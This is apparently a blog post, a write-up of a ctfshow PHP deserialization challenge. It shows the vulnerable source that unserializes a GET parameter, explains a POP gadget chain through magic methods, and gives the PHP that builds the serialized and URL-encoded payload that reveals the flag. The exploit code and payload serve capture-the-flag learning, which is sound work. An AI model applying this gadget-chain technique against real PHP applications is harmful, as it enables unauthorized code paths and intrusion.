+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">one</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$object</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">MeMeMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::MeMeMe()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nv">$prev</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::MeMeMe()::array_walk()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$fn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;Happy_func&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$prev</span> <span class="o">===</span> <span class="s2">&#34;year_parm&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$talk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$talk</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::__destruct()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::__toString()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">second</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">addMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;second::addMe()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Wow you have sovled&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;second::__call()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$func</span><span class="o">.</span><span class="s2">&#34;Me&#34;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">third</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;third::__construct()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;third::__get()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//throw new Exception(&#34;高一新生报道&#34;);	先注释掉，方便调试。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;please get ctfshow&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="pop链-1">pop链<a hidden class="anchor" aria-hidden="true" href="#pop链-1">#</a></h3>
+<p>现在来反向构造pop利用链，<code>one::MeMeMe()</code>-&gt;<code>third::__get()</code>-&gt;&hellip;</p>
+<p>正向构造一下试试，<code>one::__destruct()</code>-&gt;<code>second::__call()</code>-&gt;<code>second::addMe()</code>-&gt;<code>one::__toString()</code>-&gt;&hellip;</p>
+<p>结合一下，整个正向pop链为：<code>one::__destruct()</code>-&gt;<code>second::__call()</code>-&gt;<code>second::addMe()</code>-&gt;<code>one::__toString()</code>-&gt;<code>third::__get()</code>-&gt;<code>one::MeMeMe()</code></p>
+<p>首先通过<code>one::__destruct()</code>调用一个不存在的<code>add()</code>去触发<code>second::__call()</code>然后通过<code>call_user_func()</code>回调自身的<code>second::addMe()</code>这里return了一个<code>String类型</code>，所以可以去触发<code>one::__toString()</code>然后返回了一个不存在的<code>string</code>变量去触发<code>third::__get()</code>，最后在调用<code>one::MeMeMe()</code>拿到flag。</p>
+<p>擦，昨天弄2小时，今天弄了快3小时，现在闭着眼都能写出来了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Author: F10wers_13eiCheng
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Date:   2022-02-01 11:25:02
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Last Modified by:   F10wers_13eiCheng
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @Last Modified time: 2022-02-07 15:08:18
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;./HappyYear.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">one</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$object</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$year_parm</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;Happy_func&#34;</span><span class="p">);</span>	<span class="c1">//构造一个数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">MeMeMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::MeMeMe()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nv">$prev</span><span class="p">){</span>	<span class="c1">//当array_walk传入类的时候会将类里面的变量名和变量名当成数组。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::MeMeMe()::array_walk()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$fn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;Happy_func&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$prev</span> <span class="o">===</span> <span class="s2">&#34;year_parm&#34;</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">//$year_parm = array(&#34;Happy_func&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">global</span> <span class="nv">$talk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$talk</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::__destruct()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;one::__toString()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">second</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">third</span><span class="p">([</span><span class="s2">&#34;string&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="k">new</span> <span class="nx">one</span><span class="p">(),</span><span class="s2">&#34;MeMeMe&#34;</span><span class="p">]]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>	<span class="c1">//手动构造`__construct`用来触发下面的`second::addMe()`-&gt;`one::__toString()`，同时给`third::__construct`传入实参。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">addMe</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;second::addMe()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Wow you have sovled&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;second::__call()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$func</span><span class="o">.</span><span class="s2">&#34;Me&#34;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">third</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;third::__construct()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>	<span class="c1">//string = [&#34;string&#34;=&gt;[new one(),&#34;MeMeMe&#34;]]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;third::__get()&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>	<span class="c1">//[&#34;string&#34;=&gt;[new one(),&#34;MeMeMe&#34;]][string]()这里会触发`third::__get()`-&gt;`one::MeMeMe()`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">second</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//`one::__destruct()`-&gt;`second::__call()`-&gt;`second::addMe()`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//`one::__destruct()`-&gt;`second::__call()`-&gt;`second::addMe()`-&gt;`one::__toString()`-&gt;`third::__get()`-&gt;`one::MeMeMe()`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="o">.</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="o">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span><span class="o">.</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>O:3:&#34;one&#34;:2:{s:6:&#34;object&#34;;O:6:&#34;second&#34;:1:{s:11:&#34;*filename&#34;;O:3:&#34;one&#34;:2:{s:6:&#34;object&#34;;O:5:&#34;third&#34;:1:{s:13:&#34;thirdstring&#34;;a:1:{s:6:&#34;string&#34;;a:2:{i:0;O:3:&#34;one&#34;:2:{s:6:&#34;object&#34;;N;s:9:&#34;year_parm&#34;;a:1:{i:0;s:10:&#34;Happy_func&#34;;}}i:1;s:6:&#34;MeMeMe&#34;;}}}s:9:&#34;year_parm&#34;;a:1:{i:0;s:10:&#34;Happy_func&#34;;}}}s:9:&#34;year_parm&#34;;a:1:{i:0;s:10:&#34;Happy_func&#34;;}}
+
+O%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D
+</code></pre><p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220722185526.png" alt=""  />
+</p>
+<h3 id="demo">demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">one</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;value&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$year_parm</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s2">&#34;Happy_func&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">MeMeMe</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;yes&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">test</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;one::test&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nv">$prev</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;one::test::array_walk&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$fn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$prev</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="s2">&#34;string&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="k">new</span> <span class="nx">one</span><span class="p">(),</span><span class="s2">&#34;MeMeMe&#34;</span><span class="p">]][</span><span class="nx">string</span><span class="p">]();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">();</span> 
+</span></span></code></pre></div><p><img loading="lazy" src="https://raw.githubusercontent.com/killdayu/killdayu.github.io_file/main/pictures/20220722185622.png" alt=""  />
+</p>
+<p>还有个垃圾回收GC机制来绕过异常处理的，明天来写吧，今天累了。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_1/">
+    <span class="title">Next »</span>
+    <br>
+    <span>php_反序列化_1</span>
+  </a>
+</nav>
+
+  </footer><script src="https://utteranc.es/client.js"
+        repo="killdayu/killdayu.github.io"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://killdayu.com/">dayu&#39;s blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
